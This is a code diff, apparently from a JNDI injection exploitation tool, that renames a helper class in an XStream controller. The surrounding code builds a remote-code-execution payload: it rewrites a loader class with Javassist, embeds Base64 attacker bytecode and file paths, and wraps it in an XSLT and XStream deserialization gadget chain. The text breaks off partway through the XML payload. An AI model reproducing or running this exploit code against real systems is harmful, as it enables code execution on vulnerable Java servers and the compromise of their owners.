@@ -8,7 +8,7 @@ import map.jndi.annotation.JNDIController;
 import map.jndi.annotation.JNDIMapping;
 import map.jndi.controller.BasicController;
 import map.jndi.payload.XSLTPayload;
-import map.jndi.template.XSLTHelper;
+import map.jndi.template.XSLTLoader;
 import map.jndi.util.MiscUtil;
 import map.jndi.util.ReflectUtil;
 import org.apache.naming.ResourceRef;
@@ -32,17 +32,17 @@ public class XStreamController extends BasicController {
         String xsltPath = "/tmp/" + fileName + ".lock";
         String classPath = "/tmp/" + fileName + ".class";
 
-        String helperClassName = MiscUtil.getClassName();
+        String loaderClassName = MiscUtil.getClassName();
         ClassPool pool = ClassPool.getDefault();
-        CtClass helperClazz = pool.get(XSLTHelper.class.getName());
-        helperClazz.replaceClassName(helperClazz.getName(), helperClassName);
+        CtClass loaderClazz = pool.get(XSLTLoader.class.getName());
+        loaderClazz.replaceClassName(loaderClazz.getName(), loaderClassName);
 
-        ReflectUtil.setCtField(helperClazz, "xsltPath", CtField.Initializer.constant(xsltPath));
-        ReflectUtil.setCtField(helperClazz, "classPath", CtField.Initializer.constant(classPath));
-        ReflectUtil.setCtField(helperClazz, "className", CtField.Initializer.constant(className));
-        ReflectUtil.setCtField(helperClazz, "payload", CtField.Initializer.constant(Base64.getEncoder().encodeToString(byteCode)));
+        ReflectUtil.setCtField(loaderClazz, "xsltPath", CtField.Initializer.constant(xsltPath));
+        ReflectUtil.setCtField(loaderClazz, "classPath", CtField.Initializer.constant(classPath));
+        ReflectUtil.setCtField(loaderClazz, "className", CtField.Initializer.constant(className));
+        ReflectUtil.setCtField(loaderClazz, "payload", CtField.Initializer.constant(Base64.getEncoder().encodeToString(byteCode)));
 
-        String xsltContent = XSLTPayload.loadClass(helperClassName, helperClazz.toBytecode());
+        String xsltContent = XSLTPayload.loadClass(loaderClassName, loaderClazz.toBytecode());
         String payload = "<sorted-set>" +
                 "  <javax.naming.ldap.Rdn_-RdnEntry>" +
                 "    <type>test</type>" +
